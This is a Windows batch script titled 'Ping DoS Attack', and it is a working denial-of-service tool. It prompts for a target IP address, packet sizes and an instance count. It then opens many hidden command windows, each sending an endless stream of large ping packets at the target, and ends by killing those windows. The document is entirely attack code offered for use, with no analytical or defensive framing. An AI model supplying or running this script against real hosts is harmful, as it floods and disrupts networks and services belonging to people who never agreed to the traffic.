@echo off
color A
setlocal
title Ping DoS Attack
echo Ping DoS
set /p ip="Target IP address: "
echo Checking...
if not %ip:,=% == %ip% (
	echo ERROR: IP address contains non-alphabet or non-numeric character
	echo Press any key to exit...
	pause >nul
	exit
)
if not %ip::=% == %ip% (
	echo ERROR: IP address contains non-alphabet or non-numeric character
	echo Press any key to exit...
	pause >nul
	exit
)
for /f "skip=5 tokens=10" %%i in ('ping %ip% -n 1') do (
	if %%i == 1 (
		echo ERROR: IP address unreachable
		echo Press any key to exit...
		pause >nul
		exit
	)
)
echo IP address reachable
set /p psmin="Packet size min (<=65500): "
set /p psmax="Packet size max (<=65500): "
if %psmin% gtr %psmax% (
	echo ERROR: min. packet size ^> max. packet size
	echo Press any key to exit...
	pause >nul
	exit
)
set /p inst="Instances: "
echo Attack commencing...
setlocal enabledelayedexpansion
for /l %%i in (1, 1, %inst%) do (
	set /a "ps=(!random! * (%psmax% - %psmin% + 1) / 32768 + %psmin%)"
	start /min cmd "Ping DoS Attack" /c "echo off & ping %ip% -t -l !ps!"
)
endlocal
echo Press any key to stop attack...
pause >nul
endlocal
taskkill /fi "IMAGENAME eq cmd.exe" /fi "WINDOWTITLE eq Ping DoS Attack" /f /t >nul